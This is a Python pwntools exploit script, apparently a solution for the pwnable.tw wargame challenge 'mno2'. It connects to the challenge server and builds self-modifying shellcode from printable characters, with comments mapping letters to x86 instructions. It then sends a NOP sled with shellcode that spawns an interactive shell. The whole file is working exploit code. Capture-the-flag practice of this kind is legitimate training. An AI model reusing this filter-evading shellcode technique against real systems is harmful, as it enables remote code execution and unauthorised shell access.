#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

local = 0
if local:
    p = process('./mno2')
else:
    p = remote('chall.pwnable.tw', 10301)

cmd = 'b *0x80487e8\nc\nb *0x324f6e88\nc\nb *0x324f6efa\nc\nb *0x324f6f4d\nc'
#gdb.attach(p, cmd)

#[H]		dec eax
#[B]		inc edx
#[C]		inc ebx
#[N]		dec esi
#[O]		dec edi
#[F]		inc esi
#[P]		push eax
#[S]		push ebx
#[K]		dec ebx
#[V]		push esi
#[Y]		pop ecx
#[I]		dec ecx
#[W]		push edi
#[U]		push ebp

base = 0x324f6e4d
sh = (
	'PSSSSSSS' + 'Ba' + 'N' + 'Cf15MoO2' + # [0x324f6f4d] = 0x32 ^ 0xff = 0xcd
        'F' * 0x27 + 'Cf15NoO2' # [0x324f6f4e] = 0x31 ^ 0x4c ^ 0xff = 0x80
        'C' + 'N' * 0x27 + 'SPVWWWWW' + 'Ba'
).ljust(0x100, 'P') + '2Y'
print disasm(sh)
p.sendline(sh)
payload = '\x90' * 0x110 + asm(shellcraft.sh())
p.sendline(payload)

p.interactive()

